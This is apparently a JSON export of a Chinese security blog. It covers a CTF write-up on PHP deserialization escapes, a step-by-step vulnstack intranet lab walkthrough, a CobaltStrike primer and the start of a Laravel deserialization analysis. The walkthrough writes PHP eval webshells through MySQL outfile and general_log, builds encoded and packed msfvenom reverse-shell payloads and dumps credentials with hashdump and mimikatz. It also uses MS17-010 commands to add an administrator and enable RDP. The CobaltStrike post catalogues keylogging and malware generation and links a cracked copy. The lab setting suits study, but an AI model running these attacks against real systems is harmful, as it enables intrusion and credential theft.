case &#39;a&#39;: case &#39;O&#39;: case &#39;s&#39;: if(preg_match( &quot;/^{$badions[1]}:[0-9]+:.*[;}]\\$/s&quot;, $data ) ) return true; break; case &#39;b&#39;: case &#39;i&#39;: case &#39;d&#39;: if(preg_match(&quot;/^{$badions[1]}:[0-9.E-]+;\\$/&quot;, $data)) return true; break; } return false; } $log = $_GET[&#39;log&#39;]; if(!is_serialized($log)){ die(&#39;no1&#39;); } $log1 = preg_replace(&quot;/A/&quot;,&quot;C&quot;,$log); $log2 = preg_replace(&quot;/B/&quot;,&quot;D&quot;,$log1); if(!unserialize($log2)){ die(&#39;no2&#39;); } $log = preg_replace(&quot;/[&lt;&gt;*#&#39;|?\\n ]/&quot;,&quot;&quot;,$log); $log = str_replace(&#39;flag&#39;,&#39;&#39;,$log); $log_unser = unserialize($log); ?&gt; 看着长，其实简单的很。首先抛开waf不看。A类控制参数，B类readfile，而A类下wakeup下正好有个调用B类的obj。所以直接 &lt;?php class A { public $file; public $weblogfile; } $a=new A(); $a-&gt;weblogfile=&#39;flag.php&#39;; echo serialize($a); ?&gt; 即可，但是肯定不会这么简单的，关键在这里： 在前面用:&lt;8绕过了 $r = preg_match_all(&#39;/:\\d*?:&quot;/&#39;,$data,$m,PREG_OFFSET_CAPTURE); 之后，传到log2那里就变成了这样： O:1:&quot;C&quot;:2:{s:4:&quot;file&quot;;s:14:&quot;flag{xxxxxxxx}&quot;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;fflaglag.php&quot;;} 显然这是无法成功反序列化的，我们需要让字符逃逸，长度为25 &quot;;s:10:&quot;weblogfile&quot;;s:40: 利用flag和一堆符号都能换空的特点： &lt;?php class A { public $file=&#39;flagflagflagflagflagflag&lt;&#39;; public $weblogfile=&#39;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;flflagag.php&quot;;}&#39;; } echo serialize (new A); 这样传到log2那里就变成了： O:1:&quot;C&quot;:2:{s:4:&quot;file&quot;;s:25:&quot;flagflagflagflagflagflag&lt;&quot;;s:10:&quot;weblogfile&quot;;s:40:&quot;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;flflagag.php&quot;;}&quot;;} 变成了字符串的一部分，可以正常执行。简单题。 三、weblogin看了提示好像又是个php反序列化字符串逃逸。。。这个我懂，反序列化逃逸好出并且看起来比较难，我最近也出了一个字符串逃逸的，不过没这么复杂。 源码很长，是一个处理用户的路由。这种很长的源码直接倒推，先找flag输出点： 看起来是要写个满足条件的文件才会输出flag。全局搜索file_put，找到四个全是 file_put_contents($file,enc(serialize($p)));来看一下这个enc： function enc($str){ $_str = &#39;&#39;; for($i=0;$i&lt;strlen($str);$i++){ if ($str[$i] !== &#39;=&#39;){ $_str = $_str.&#39;=&#39;.dechex(ord($str[$i])); }else{ $_str = $_str.$str[$i].$str[$i+1].$str[$i+2]; $i = $i+2; } } return $_str; } 试一下： 转换成等号加16进制的ascii码。但是下面那个i+2很明显说明了不会处理已经编码过的，比如： 有啥用呢，这就得看下面反序列化里面的伪协议： $p = unserialize(filter(file_get_contents(&#39;php://filter/read=convert.quoted-printable-decode/resource=&#39;.$file))); 简单点说就是把上面编码过的解码，比如=31变成1，字符减少了两个。接下来看控制生成文件的地方： datafile可控。 class Action { public $data=array(); public $username=&#39;Troy3e&#39;; public $password=&#39;Troy3e&#39;; public $datafile=&#39;flag01476f0ab4de69015b1b6e07a0e84095&#39;; public $act=&#39;register&#39;; } echo serialize(new Action()); //O:6:&quot;Action&quot;:5:{s:4:&quot;data&quot;;a:0:{}s:8:&quot;username&quot;;s:6:&quot;Troy3e&quot;;s:8:&quot;password&quot;;s:6:&quot;Troy3e&quot;;s:8:&quot;datafile&quot;;s:36:&quot;flag01476f0ab4de69015b1b6e07a0e84095&quot;;s:3:&quot;act&quot;;s:8:&quot;register&quot;;} 但是在这里面action无法控制，然而我们可以控制username和password，还是那句话，永远不要相信用户的输入。 &lt;?php class Action { public $data=array(&#39;Troy3e&#39;,&#39;Troy3e&#39;); public $username=&#39;&#39;; public $password=&#39;&#39;; public $datafile=&#39;&#39;; public $act=&#39;&#39;; } echo serialize(new Action()); ?&gt; //O:6:&quot;Action&quot;:5:{s:4:&quot;data&quot;;a:2:{i:0;s:6:&quot;Troy3e&quot;;i:1;s:6:&quot;Troy3e&quot;;}s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:0:&quot;&quot;;s:3:&quot;act&quot;;s:0:&quot;&quot;;} 到这其实就很明显了username处控制长度逃逸出数组，password里面是我们控制的反序列化的内容。 十个。后面就不多说了，直接贴个官方payload： username==50=50=50=50=50&amp;password=a&quot;;s:1:&quot;a&quot;;}s:8:&quot;username&quot;;s:9:&quot;lastsward&quot;;s:8:&quot;password&quot;;s:9:&quot;lastsward&quot;;s:8:&quot;datafile&quot;;s:36:&quot;flagf528764d624db129b32c21fbca0cb8d6&quot;;s:3:&quot;act&quot;;s:8:&quot;register&quot;;} 四、impossible ip后面那个ssrf打fpm已经做烂了就不讲了，看一下前面这个socket。 这个知识点我倒是没见过，学习了。 总结：闲着没事，就看四个。这几个还是比较简单的。溜了，学习去了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"vulnstack内网靶场(一)保姆级教程","slug":"vulnstack红队实战-一","date":"2021-06-03T06:03:51.000Z","updated":"2021-06-04T13:01:33.954Z","comments":true,"path":"2021/06/03/vulnstack红队实战-一/","link":"","permalink":"/2021/06/03/vulnstack红队实战-一/","excerpt":"","text":"断断续续挖了几周的洞了，有一说一要比CTF简单得多，虽然交上去有效的不多。然后我发现一个问题，那就是我根本不会内网。CTF里面极少出现内网渗透，基本都是绕过读flag或者绕过getshell这种。所以在去实习前还需要学一下内网的知识。今天在安全客逛街的时候看到了这个红日安全团队的vulnstack靶场，来学习一下。网上看了看都是很简略的教程，而这个靶场配置的时候确实有很多要注意的地方，那我就来写个保姆级教程吧。链接：http://vulnstack.qiyuanxuetang.net/vuln/ 环境搭建http://vulnstack.qiyuanxuetang.net/vuln/detail/2/首先嫖一个百度云vip账号把环境下载下来。 拓扑图如下： 下载好以后设置一下网络（模拟内网外网 192.168.52.0/24为模拟内网环境。（Vmnet1）192.168.72.0/24为模拟公网环境。（Vmnet2）攻击者机器与win7的第一张网卡处于Vmnet1。（模拟公网）win7的另一张网卡与win2k3、win2k8处于Vmnet2。（模拟内网）一定注意这里不能把公网内网弄反了，下面直接上图：kali（攻击机： Windows7 x64：（重点！！！这里必须是上面VMnet1，下面VMnet2，不能弄反！！！ 剩下的两个按上面方式设置为 VMnet1 即可。 接下来是重点，那就是win7的配置首先进去用给的密码hongrisec@2019登录。然而进去之后你会发现phpstudy打开报错，啥都干不了。原因可能是目前这个账号的问题，我的解决方案：https://jingyan.baidu.com/article/37bce2be193fd51003f3a259.html 照做之后，再次登录的地方选择切换账号，输入god\\administrator即可登进一开始的账号，密码是你上面自己设置的。登进去之后在c盘找到phpstudy启动即可。测试： ping通说明就没问题了。 外网渗透首先是信息收集，使用kali自带的Netdiscover扫一下C段 netdiscover -i eth0 -r 192.168.72.0/24 -i 选择监控的网卡 -r 指定ip段 nmap扫端口 访问80端口 一个phpstudy探针，在下面有个测试连接数据库，这里下意识想到构造mysql恶意服务器读取任意文件，用自己vps试了下然而忘记现在是不出网的。。。尝试本地服务器弱口令root root ，显示连接正常。dirsearch扫一遍 这里图里的ip是错的，用的之前的图懒得改了，懂得都懂。dir太垃圾了漏了个源码beifen.rar，手动加上。在备份文件里找到后台 可以直接登后台getshell，比较简单就不弄了。转phpadmin，利用弱口令登录。一、into outfile写木马条件：1、对web目录需要有写权限能够使用单引号2、知道绝对路径3、没有配置secure-file-priv(限制文件传到指定目录)（注意是没有，不是NULL） show globals variables like &#39;secure%&#39; 写马： select &#39;&lt;?php @eval($_POST[111]);?&gt;&#39; into outfile &#39;C:/phpStudy/WWW/yxcms/troy3e.php&#39; 当然这里是NULL是不行的（无法动态修改），所以得换另一种方法。 二、利用日志文件getshell set global general_log=&#39;on&#39; 看一下日志路径，现在所有执行的sql语句都会出现在stu1.log。但是这个值是可以修改的，我们把它改成php： set global general_log_file=&#39;C:/phpStudy/WWW/yxcms/public/troy3e.php&#39; 现在执行包含一句话木马语句： select &#39;&lt;?php @eval($_POST[111]);?&gt;&#39; 蚁剑 反弹一个MSF的shell msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=8888 -f exe -o win.exe #lhost是我们的主机ip，lport是我们主机的用于监听的端口 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=8888 -i 3 -e x86/shikata_ga_nai -f exe -o win.exe #编码3次 还可以upx加个壳防溯源： upx -9 win.exe -k -o win2.exe 我这里win10试了下还是被杀了。然后打开msfconsole： msf &gt; use exploit/multi/handler #使用exploit/multi/handler监听从肉鸡发来的数据 msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp #设置payload，不同的木马设置不同的payload msf exploit(handler) &gt; set lhost 192.168.72.129 #我们的主机ip msf exploit(handler) &gt; set lport 8888 #我们的主机端口 msf exploit(handler) &gt; exploit 执行msf马 由于这里进来直接是管理员用户，所以直接能提到system 派生CobaltStrike权限用CS获取权限和msf没啥区别，这里主要提一下把msf的shell转发到CS上。首先CS上开个监听，CS咋用我好像发了一篇博客了。 use exploit/windows/local/payload_inject set payload windows/meterpreter/reverse_http set DisablePayloadHandler true #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true set lhost xxxx #cobaltstrike监听的ip set lport 14444 #cobaltstrike监听的端口 set session 1 #这里是获得的session的id exploit 由于我搭的环境没法出网，就不上图了。 获取账号密码重新进入刚刚的shell sessions -l 查看所有获得的session sessions -i 1 进入 1、导出hash： run hashdump 或者 run windows/gather/smart_hashdump 2、加载kiwi模块 load kiwi 使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限。 creds_all：列举所有凭据 creds_kerberos：列举所有kerberos凭据 creds_msv：列举所有msv凭据 creds_ssp：列举所有ssp凭据 creds_tspkg：列举所有tspkg凭据 creds_wdigest：列举所有wdigest凭据 dcsync：通过DCSync检索用户帐户信息 dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID golden_ticket_create：创建黄金票据 kerberos_ticket_list：列举kerberos票据 kerberos_ticket_purge：清除kerberos票据 kerberos_ticket_use：使用kerberos票据 kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令 lsa_dump_sam：dump出lsa的SAM lsa_dump_secrets：dump出lsa的密文 password_change：修改密码 wifi_list：列出当前用户的wifi配置文件 wifi_list_shared：列出共享wifi配置文件/编码 creds_all 失败。 3、加载mimikatz模块 加载mimikatz模块首先需要将msf迁移到64位的进程里ps看一下进程随便进一个 migrate 352 由于mimikatz已被kiwi吞并，所以直接： kiwi_cmd sekurlsa::logonpasswords 得到密码。 远程桌面（注意这下面图里的ip也是错的，之前写的了，不过问题不大，懂得都懂。一般情况下并不建议使用管理员账户来远程，因为这样会将管理员挤下线，暴露自己的行动。所以我们新建一个用户： 麻了把自己加到管理员组 一开始记得没扫出来3389端口，这里再试一次 果然，大概是被过滤了。再次打开万能的msf run post/windows/manage/enable_rdp 报错了。手动开启也没成，估计是进程的原因？ 重新执行一遍木马（因为我这里进到低权限进程跳不回去了换个别的进程，成功： rdesktop 192.168.52.143 然后拿我们刚刚注册的新用户登进去就行。 添加路由、挂Socks5代理添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务 在使用代理之前，我们需要先添加路由，让MSF能到达目标机器内网。因为这里socks模块只是将代理设置为监听的端口(默认是1080),即通过proxychains的流量都转给本地的1080端口，又因为这是MSF起的监听端口，所以通过代理走的流量也都能到达内网。 1、添加路由 添加内网路由 run autoroute -s 192.168.52.0/24 route add 0.0.0.0 0.0.0.0 1 注意先background route print 2、搭建Socks4a代理 use auxiliary/server/socks_proxy set version 4a set SRVHOST 0.0.0.0 //这两个默认，没特殊需求其实不用填 set SRVPORT 1080 //set USERNAME root //set PASSWORD Password@ run 然后修改/etc/proxychains.conf在最后一行添加 socks4 127.0.0.1 1080 //若前面设置了用户名密码这里跟上即可 测试： 注意！！！这里是内网的ip！！！是52不是72。打通。接下来就可以用msf模块、nmap、fscan这类工具对内网进行信息收集。当然也可以指向我们的vps，但是实战建议使用frp。 域信息收集net time /domain #查看时间服务器 net user /domain #查看域用户 net view /domain #查看有几个域 net group &quot;domain computers&quot; /domain #查看域内所有的主机名 net group &quot;domain admins&quot; /domain #查看域管理员 net group &quot;domain controllers&quot; /domain #查看域控 由此可见我们现在就是域管理员权限。 拿下域成员主机按上面步骤设置好了代理，就可以用工具进行信息收集了 proxychains nmap -p 0-1000 -Pn -sT 192.168.52.141 因为这nmap扫的实在是太慢了，就不放图了。。。 使用msf辅助模块进行扫描，查看是否存在ms17-010漏洞 三个都可能存在。使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell。 use auxiliary/admin/smb/ms17_010_command show options set RHOSTS 192.168.52.141 set command net user Troy3e !@#123qwe!@# /add #添加用户 run #成功执行 set command net localgroup administrators Troy3e /add #管理员权限 run #成功执行 set command &#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39; run #成功执行 使用proxychains连接 proxychains rdesktop 192.168.52.141 然后使用exploit/windows/smb/ms17_010_psexec 尝试去打一个shell回来 打了十几次都没通，放弃了。网上也说这个成功率很低，主要还是2003的原因。 拿下域控在前面我们已经拿到了域用户的帐号密码，即administrator、HONGRISEC@2019我们现在要做的就是如何登录到域控上去定位到域控制器的ip为192.168.52.138还是先利用smb扫描系统版本 auxiliary/scanner/smb/smb_version ms17_010_psexec失败 换MS08-067 后面试了好多模块都不行，不知道原因，这里就列几种可以用的吧，已经打了太长时间吃不消了： MS17-010 CVE-2019-0708 psexec攻击 哈希传递攻击 MS14-068 哈希传递攻击可以一试。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"初识CobaltStrike","slug":"初识CobaltStrike","date":"2021-05-23T15:22:12.000Z","updated":"2021-05-24T06:31:35.814Z","comments":true,"path":"2021/05/23/初识CobaltStrike/","link":"","permalink":"/2021/05/23/初识CobaltStrike/","excerpt":"","text":"好久没更新博客了，这几星期感觉做了很多事情，又感觉什么事都没干。又想挖洞，又想往开发方向发展，比赛也零零碎碎打了不少。马上就要被拉去做hvv免费苦力了，在这之前学习一下CS神器的使用。 CobaltStrike是什么CobaltStrike是一款渗透测试神器，被业界人称为CS神器。CobaliSitike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。Cobaltsitrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe木马生成，windows dl木马生成，java木马生成，office宏病毒生成，木马捆绑。钓鱼攻击包括:站点克隆，目标信息获取，java执行，浏览器自动攻击等等。 CobaltStrike的安装我采用的是最近刚放出来的4.3的破解版。 链接：https://pan.baidu.com/s/1Kzv0fRcYthoP2QYHq98vTw提取码：tvmy来源于某公众号，使用后造成的风险自行承担。链接挂了的话。。。挂了就挂了，应该也没人看我博客。一、服务端团队服务器最好搭在linux服务器上。 没什么环境要求，jdk8即可。启动命令：./teamserver 你的ip 你的密码 上图所示便是成功启动。端口默认50050，云服务器记得手动去控制台开一下。如果你这里报错的话，请检查：1、java版本是否正确（请使用jdk8）2、是否更改了teamserver里的文件，比如修改了密码。这里说明一下，文件里的密码123456是不能更改的。密码直接在命令里指定即可。 二、客户端客户端我个人认为还是windows比较方便些，直接双击exe运行即可： 按你自己配置的信息写入。 目录信息及参数说明CobaltStrike—些主要文件功能如下: agscript:扩展应用的脚本 c2lint:用于检查profile的错误和异常 teamserver:服务器端启动程序 cobaltstrike.jar: CobaltStrike核心程序 cobaltstrike.auth:用于客户端和服务器端认证的文件，客户端和服务端有一个一模一样的 cobaltstrike.store:秘钥证书存放文件 —些目录作用如下: data:用于保存当前TeamServer的一些数据 download:用于存放在目标机器下载的数据 upload: 上传文件的目录 logs:日志文件，包括Web日志、Beacon日志、截图日志、下载日志、键盘记录日志等 third-party:第三方工具目录 Cobalt Strike New Connection # 新建连接，支持连接多个服务器端 Preferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录 Visualization # 主要展示输出结果的视图 VPN Interfaces # 设置VPN接口 Listenrs # 创建监听器 Script Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等 Close # 退出连接 View Applications # 显示受害主机的应用信息 Credentials # 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz Downloads # 查看已下载文件 Event Log # 主机上线记录以及团队协作聊天记录 Keystrokes # 查看键盘记录结果 Proxy Pivots # 查看代理模块 Screenshots # 查看所有屏幕截图 Script Console # 加载第三方脚本以增强功能 Targets # 显示所有受害主机 Web Log # 所有Web服务的日志 AttacksPackages HTML Application # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件 MS Office Macro # 生成office宏病毒文件 Payload Generator # 生成各种语言版本的payload USB/CD AutoPlay # 生成利用自动播放运行的木马文件 Windows Dropper # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差) Windows Executable # 生成可执行exe木马 Windows Executable(Stageless) # 生成无状态的可执行exe木马 Web Drive-by Manage # 对开启的web服务进行管理 Clone Site # 克隆网站，可以记录受害者提交的数据 Host File # 提供文件下载，可以选择Mime类型 Scripted Web Delivery # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery Signed Applet Attack # 使用java自签名的程序进行钓鱼攻击(该方法已过时) Smart Applet Attack # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时) System Profiler # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等 Spear Phish # 鱼叉钓鱼邮件 Reporting Activity Report # 活动报告 Hosts Report # 主机报告 Indicators of Compromise # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes Sessions Report # 会话报告 Social Engineering Report # 社会工程报告：包括鱼叉钓鱼邮件及点击记录 Tactics, Techniques, and Procedures # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略 Reset Data # 重置数据 Export Data # 导出数据，导出.tsv文件格式 Help Homepage # 官方主页 Support # 技术支持 Arsenal # 开发者 System information # 版本信息 About # 关于 CobaltStrike的使用一、创建监听器Listener点击Cobalt Strike选择listeners，点击下方的add name：为监听器名字，可任意 payload：payload类型 HTTP Hosts: shell反弹的主机，也就是我们kali的ip HTTP Hosts(Stager): Stager的马请求下载payload的地址 HTTP Port(C2): C2监听的端口 Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上;其中包含DNS、HTTP、HTTPS、SMB。Beacon可以选择通过DNS还是HTTP协议出口网络，你甚至可以在使用Beacon通讯过程中切换HTTP和DNS。其支持多主机连接，部署好Beacon后提交一个要连回的域名或主机的列表，Beacon将通过这些主机轮询。目标网络的防护团队必须拦截所有的列表中的主机才可中断和其网络的通讯。通过种种方式获取she以后（(比如直接运行生成的exe)，就可以使用Beacon了。Foreign为外部结合的Listener，常用于MSF的结合，例如获取meterpreter到MSF上。 二、创建攻击Attacks这里Attacks有几种，如下： · HTML Application 生成一个恶意HTML Application木马，后缀格式为 .hta。通过HTML调用其他语 言的应用组件进行攻击，提供了 可执行文件、PowerShell、VBA三种方法。 · MS Office Macro 生成office宏病毒文件； · Payload Generator 生成各种语言版本的payload，可以生成基于C、C#、COM Scriptlet、Java、Perl、 PowerShell、Python、Ruby、VBA等的payload · Windows Executable 生成32位或64位的exe和基于服务的exe、DLL等后门程序 · Windows Executable(S) 用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存 Windows Executable 双击生成的程序，记得把windows自带的保护关掉 对被控主机的操作Interact 打开beacon Access dump hashes 获取hash Elevate 提权 Golden Ticket 生成黄金票据注入当前会话 MAke token 凭证转换 Run Mimikatz 运行 Mimikatz Spawn As 用其他用户生成Cobalt Strike的beacon Explore Browser Pivot 劫持目标浏览器进程 Desktop(VNC) 桌面交互 File Browser 文件浏览器 Net View 命令Net View Port scan 端口扫描 Process list 进程列表 Screenshot 截图 Pivoting SOCKS Server 代理服务 Listener 反向端口转发 Deploy VPN 部署VPN Spawn 新的通讯模式并生成会话 Session 会话管理，删除，心跳时间，退出，备注 一、命令说明beacon处输入help： Beacon Commands =============== Command Description ------- ----------- argue 进程参数欺骗 blockdlls 在子进程中阻止非Microsoft的DLLs文件 browserpivot 注入受害者浏览器进程 bypassuac 绕过UAC cancel 取消正在进行的下载 cd 切换目录 checkin 强制让被控端回连一次 clear 清除beacon内部的任务队列 connect 通过TCP连接到Beacon covertvpn 部署Covert VPN客户端 cp 复制文件 dcsync 从DC中提取密码哈希 desktop 远程VNC dllinject 反射DLL注入进程 dllload 使用LoadLibrary将DLL加载到进程中 download 下载文件 downloads 列出正在进行的文件下载 drives 列出目标盘符 elevate 尝试提权 execute 在目标上执行程序(无输出) execute-assembly 在目标上内存中执行本地.NET程序 exit 退出beacon getprivs 对当前令牌启用系统权限 getsystem 尝试获取SYSTEM权限 getuid 获取用户ID hashdump 转储密码哈希值 help 帮助 inject 在特定进程中生成会话 jobkill 杀死一个后台任务 jobs 列出后台任务 kerberos_ccache_use 从ccache文件中导入票据应用于此会话 kerberos_ticket_purge 清除当前会话的票据 kerberos_ticket_use 从ticket文件中导入票据应用于此会话 keylogger 键盘记录 kill 结束进程 link 通过命名管道连接到Beacon logonpasswords 使用mimikatz转储凭据和哈希值 ls 列出文件 make_token 创建令牌以传递凭据 mimikatz 运行mimikatz mkdir 创建一个目录 mode dns 使用DNS A作为通信通道(仅限DNS beacon) mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon) mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon) mode http 使用HTTP作为通信通道 mv 移动文件 net net命令 note 给当前目标机器备注 portscan 进行端口扫描 powerpick 通过Unmanaged PowerShell执行命令 powershell 通过powershell.exe执行命令 powershell-import 导入powershell脚本 ppid 为生成的post-ex任务设置父PID ps 显示进程列表 psexec 使用服务在主机上生成会话 psexec_psh 使用PowerShell在主机上生成会话 psinject 在特定进程中执行PowerShell命令 pth 使用Mimikatz进行传递哈希 pwd 当前目录位置 reg 查询注册表 rev2self 恢复原始令牌 rm 删除文件或文件夹 rportfwd 端口转发 run 在目标上执行程序(返回输出) runas 以另一个用户权限执行程序 runasadmin 在高权限下执行程序 runu 在另一个PID下执行程序 screenshot 屏幕截图 setenv 设置环境变量 shell cmd执行命令 shinject 将shellcode注入进程 shspawn 生成进程并将shellcode注入其中 sleep 设置睡眠延迟时间 socks 启动SOCKS4代理 socks stop 停止SOCKS4 spawn 生成一个会话 spawnas 以其他用户身份生成会话 spawnto 将可执行程序注入进程 spawnu 在另一个PID下生成会话 ssh 使用ssh连接远程主机 ssh-key 使用密钥连接远程主机 steal_token 从进程中窃取令牌 timestomp 将一个文件时间戳应用到另一个文件 unlink 断开与Beacon的连接 upload 上传文件 wdigest 使用mimikatz转储明文凭据 winrm 使用WinRM在主机上生成会话 wmi 使用WMI在主机上生成会话 二、提权右键-&gt;Access-&gt;Elevate 我这里因为是win10，自带的两个payload都不能成功提权。 若提权成功，会返回来一个管理员的shell。当然我这里还是返回了一个普通权限： 三、抓取hash和dump明文密码 右键-&gt;Access-&gt;DumpHashes利用mimikatz抓取明文密码：右键-&gt;Access-&gt;Run Mimikatz 抓取密码哈希，也可以直接输入hashdump使用mimikatz抓取明文密码，也可以直接输入logonpasswords 抓取完之后点击凭证信息，就会显示我们抓取过的哈希或明文。由于我没有管理员权限，所以并没有尝试。 四、利用被控主机建立Socks4代理 当我们控制的主机是一台位于公网和内网边界的服务器，我们想利用该主机继续对内网进行渗透，于是，我们可以利用CS建立socks4A代理 然后vim /etc/proxychains.conf ，在文件末尾添加socks4代理服务器 socks4 服务端ip 9071使用proxychains代理扫描内网主机proxychains nmap -sP x.x.x.x/24 我们还可以通过隧道将整个msf带进目标内网点击View-&gt;Proxy Pivots，选择Socks4a Proxy,点击Tunnel: 打开msf对内网进行扫描 关闭socksbeacon&gt;socks stop 五、注入进程、键盘监控右键被控主机-&gt;Explore-&gt;Process List 即可列出进程列表 kill为杀死该进程，refresh为刷新该进程，inject则是把beacon注入进程，log keystrokes为键盘记录，screenshot为截图，stea token为窃取运行指定程序的用户令牌 1、Inject注入进程选择进程，点击Inject，随后选择监听器，点击choose，即可发现CobaltStrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon会话。该功能可以把你的beacon会话注入到另外—个程序之中，注入之后，除非那个正常进程被杀死了，否则我们就一直可以控制该主机了。 inject 进程PID 进程位数 监听 单击一个进程，单击inject，选择监听器，就会弹回来beacon。 2、键盘记录任意选择一个进程，点击log keystrokes，即可监听该主机的键盘记录 keylogger 进程PID 进程位数 (硬核打码.jpg 查看键盘记录结果需要点击上面那个钥匙按钮。注意这里是监听所有的键盘记录，而不只是选中进程的键盘记录。 六、浏览器代理Browser Pivot使用浏览器代理功能，我们可以注入到目标机器的浏览器进程中。然后在本地浏览器中设置该代理，这样，我们可以在本地浏览器上访问目标机器浏览器已经登录的网站，而不需要登录。但是目前浏览器代理只支持IE浏览器。如下，目标主机的IE浏览器目前在访问fofa，并且已登录。现在我们想利用浏览器代理在本地利用目标主机身份进行访问。 explore-&gt;Browser Pivot随便选一个进程，点击开始。 然后视图代理信息可以看到刚刚建立的浏览器代理。这里的意思是，TeamServer监听59398和26193端口。流程是这样，我们将流量给59398端口，59398端口将流量给26193端口，26193将流星给目标主机的26193端口。 这里懒得试了，放个图。 七、生成黄金票据注入当前会话（Golden Ticket）暂略。 八、凭证转换暂略。 九、端口扫描 portscan 192.168.10.1-192.168.10.10 22,445 arp 1024 portscan 192.168.10.1-192.168.10.10 22,445 icmp 1024 portscan 192.168.10.1-192.168.10.10 22,445 none 1024 一般我们直接运行命令 portscan 192.168.1.0/24 22,445,1433,3306 十、哈希传递攻击或SSH远程登录暂略。 十一、还有很多，暂时不写了 小结还没写完，有空继续学。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Java Web学习","slug":"Java-Web安全","date":"2021-05-13T06:16:30.000Z","updated":"2021-05-23T15:24:54.562Z","comments":true,"path":"2021/05/13/Java-Web安全/","link":"","permalink":"/2021/05/13/Java-Web安全/","excerpt":"","text":"重写中","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Laravel漏洞分析","slug":"Laravel漏洞分析","date":"2021-05-10T04:14:05.000Z","updated":"2021-05-13T04:35:21.982Z","comments":true,"path":"2021/05/10/Laravel漏洞分析/","link":"","permalink":"/2021/05/10/Laravel漏洞分析/","excerpt":"","text":"又给自己挖了个大坑。。。 通过phpStudy搭建Laravel从github上把源码down下来：https://github.com/laravel/laravel/releases?after=v5.8.35然后在根目录打开cmd：composer intsall 生成vender目录改hosts 路径：C:\\Windows\\System32\\drivers\\etc\\hosts添加127.0.0.1 www.fuck.com(Laravel必须由域名访问最后把根目录下.env.example中的内容复制到.env中（记得localhost改成www.fuck.com），cmd中执行php artisan key:generate即可。访问出现没有error就是搭建成功： ————————后记：改hosts那一步可能不是必须的。 如何利用phpStorm进行动态调试这一步是后面要用的，在进行代码审计时，通过调试进行分析是非常重要的，所以虽然有些小麻烦，但是必须会用。需要的环境：phpStorm+Xdebug+phpStudyphpStudy自带了xdebug插件，但是默认是关闭的，手动选择开启： 更改配置文件，我这里用的是7.3.4nts 只要改选中的部分，别的默认即可： （这里我用9100端口是因为有时候9000会被占用，为了避免后面冲突的麻烦换成了和网上教程都不一样的9100） 接下来 浏览器上下载Xdebug helper 在url栏后面的小虫。 然后就是配置phpStorm 下断点 浏览器刷新： 红点中打勾就说明已经成功断下来了。 Laravel 5.7.x 反序列化漏洞分析laravel 5.7是一款基于php 7.1.3之上运行的优秀php开发框架,反序列化RCE漏洞出现在核心包中，但是需要对基于laravel v5.7框架进行二次开发的cms出现可控反序列化点，才能触发漏洞实现RCE。 由于在本地搭建的仅仅是Laravel一个空架子，所以还需要手动添加一个反序列化点。在routes\\web.php增加一个路由: Route::get(&#39;/index&#39;,&#39;TaskController@index&#39;); 新建app\\Http\\Controllers\\TaskController.php，并且在此增加反序列化入口： &lt;?php namespace App\\Http\\Controllers; class TaskController { public function index(){ if(isset($_GET[&#39;ser&#39;])){ $ser = $_GET[&#39;ser&#39;]; unserialize($ser); return ; }else{ echo &quot;no unserialization&quot;; return ; } } } ?&gt; 将Laravel 5.6和5.7版本进行对比，在vendor\\laravel\\framework\\src\\Illuminate\\Foundation\\Testing\\下新版本多出了一个文件PendingCommand.php：public$test;//一个实例化的类 Illuminate\\Auth\\GenericUserprotected$app;//一个实例化的类 Illuminate\\Foundation\\Applicationprotected$command;//要执行的php函数 systemprotected$parameters;//要执行的php函数的参数 array(‘id’) 